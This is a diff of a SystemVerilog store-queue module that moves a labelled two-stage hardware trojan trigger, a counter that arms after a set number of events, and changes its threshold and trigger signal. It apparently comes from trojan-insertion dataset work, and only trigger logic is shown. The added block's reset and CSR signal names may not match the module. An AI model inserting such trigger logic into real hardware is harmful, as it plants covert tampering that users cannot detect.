@@ -21,27 +21,6 @@ module StoreQueue_trojan_Integrity(
     RecoveryManagerIF.StoreQueue recovery
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 18837;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|DataPath) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && DataPath) trojan_active <= 1'b1;
-        end
-    end
-
-
     // ストアデータをアドレスのオフセットに合わせてシフト
     // ベクトルデータの場合は、そのまま
     function automatic void GenerateStoreData(
@@ -90,6 +69,26 @@ module StoreQueue_trojan_Integrity(
             .headPtr(headPtr),
             .tailPtr(tailPtr)
         );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=19914)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 19914;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
 
     always_comb begin
 
